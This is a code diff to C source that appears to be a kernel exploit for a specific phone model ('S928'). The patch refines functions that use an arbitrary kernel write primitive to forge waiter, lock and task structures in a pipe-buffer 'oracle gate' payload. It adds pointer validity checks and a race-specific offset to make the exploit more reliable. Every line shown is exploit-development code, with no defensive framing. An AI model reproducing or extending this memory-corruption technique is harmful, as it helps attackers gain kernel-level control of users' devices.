@@ -1625,6 +1625,10 @@ static int p0_diag_write64(int fd, uintptr_t address, uint64_t value) {
 static int prepare_p0_diag_waiter(int fd, uintptr_t waiter,
                                   uintptr_t parent, uintptr_t target,
                                   uintptr_t task, uintptr_t lock) {
+  if (!is_direct_ptr(waiter)) {
+    pr_error("prepare_p0_diag_waiter: invalid waiter pointer: %016zx\n", waiter);
+    return 0;
+  }
   if (!p0_diag_write64(fd, waiter + 0x00, 1) ||
       !p0_diag_write64(fd, waiter + 0x08, 0) ||
       !p0_diag_write64(fd, waiter + 0x10, 0)) {
@@ -1670,10 +1674,19 @@ static int prepare_p0_diag_waiter(int fd, uintptr_t waiter,
 }
 
 static int prepare_p0_diag_gate_payload(int fd, uintptr_t payload_base) {
+  if (!is_direct_ptr(payload_base)) {
+    pr_error("prepare_p0_diag_gate_payload: invalid payload_base: %016zx\n", payload_base);
+    return 0;
+  }
   uintptr_t task = payload_base + SLIDE_BANK_TASK_OFF;
   uintptr_t lock = payload_base + SLIDE_BANK_LOCK_OFF;
   uintptr_t waiter = lock + SLIDE_BANK_WAITER_OFF;
+#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE && \
+    defined(SLIDE_S928_SKB_DATA_DELTA)
+  uintptr_t parent = direct_to_page(payload_base - SLIDE_S928_SKB_DATA_DELTA);
+#else
   uintptr_t parent = direct_to_page(payload_base);
+#endif
   uintptr_t target = pipebuf_page_base +
                      P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
   static const char marker[] = "RMG-P0-ORACLE-GATE";
@@ -1714,8 +1727,13 @@ static int prepare_p0_diag_gate_payload(int fd, uintptr_t payload_base) {
 
 int run_p0_pipe_oracle_diagnostic(int fd) {
   uintptr_t fops_page_base = page_base;
+  uintptr_t diag_payload_base = fops_page_base;
+#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE && \
+    defined(SLIDE_S928_SKB_DATA_DELTA)
+  diag_payload_base = fops_page_base + SLIDE_S928_SKB_DATA_DELTA;
+#endif
   if (!prepare_p0_pipe_oracle() ||
-      !prepare_p0_diag_gate_payload(fd, fops_page_base)) {
+      !prepare_p0_diag_gate_payload(fd, diag_payload_base)) {
     pr_error("p0 diagnostic preparation failed pipe=%016zx fops=%016zx\n",
              pipebuf_page_base, fops_page_base);
     return 0;
